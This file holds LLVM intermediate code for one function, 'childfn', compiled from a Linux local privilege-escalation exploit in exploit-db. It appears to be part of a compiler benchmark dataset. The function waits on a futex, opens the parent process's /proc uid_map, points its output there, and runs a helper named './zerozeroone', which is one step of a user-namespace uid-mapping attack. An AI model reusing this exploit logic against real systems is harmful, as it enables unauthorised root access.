; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25450.c_childfn.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25450.c_childfn.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SYS_futex = common dso_local global i32 0, align 4
@ftx = common dso_local global i32 0, align 4
@FUTEX_WAIT = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [6 x i8] c"futex\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"/proc/%ld/uid_map\00", align 1
@parent = common dso_local global i64 0, align 8
@O_RDWR = common dso_local global i32 0, align 4
@O_CLOEXEC = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"open %s\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"dup2\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"./zerozeroone\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @childfn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [128 x i8], align 16
  %3 = load i32, i32* @SYS_futex, align 4
  %4 = load i32, i32* @ftx, align 4
  %5 = load i32, i32* @FUTEX_WAIT, align 4
  %6 = call i32 @syscall(i32 %3, i32 %4, i32 %5, i32 0, i32 0, i32 0, i32 0)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %8, label %14

8:                                                ; preds = %0
  %9 = load i64, i64* @errno, align 8
  %10 = load i64, i64* @EWOULDBLOCK, align 8
  %11 = icmp ne i64 %9, %10
  br i1 %11, label %12, label %14

12:                                               ; preds = %8
  %13 = call i32 (i32, i8*, ...) @err(i32 1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  br label %14

14:                                               ; preds = %12, %8, %0
  %15 = getelementptr inbounds [128 x i8], [128 x i8]* %2, i64 0, i64 0
  %16 = load i64, i64* @parent, align 8
  %17 = call i32 @sprintf(i8* %15, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i64 %16)
  %18 = getelementptr inbounds [128 x i8], [128 x i8]* %2, i64 0, i64 0
  %19 = load i32, i32* @O_RDWR, align 4
  %20 = load i32, i32* @O_CLOEXEC, align 4
  %21 = or i32 %19, %20
  %22 = call i32 @open(i8* %18, i32 %21)
  store i32 %22, i32* %1, align 4
  %23 = load i32, i32* %1, align 4
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %28

25:                                               ; preds = %14
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %2, i64 0, i64 0
  %27 = call i32 (i32, i8*, ...) @err(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %26)
  br label %28

28:                                               ; preds = %25, %14
  %29 = load i32, i32* %1, align 4
  %30 = call i32 @dup2(i32 %29, i32 1)
  %31 = icmp ne i32 %30, 1
  br i1 %31, label %32, label %34

32:                                               ; preds = %28
  %33 = call i32 (i32, i8*, ...) @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %28
  %35 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @syscall(i32, i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*, ...) #1

declare dso_local i32 @sprintf(i8*, i8*, i64) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execl(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
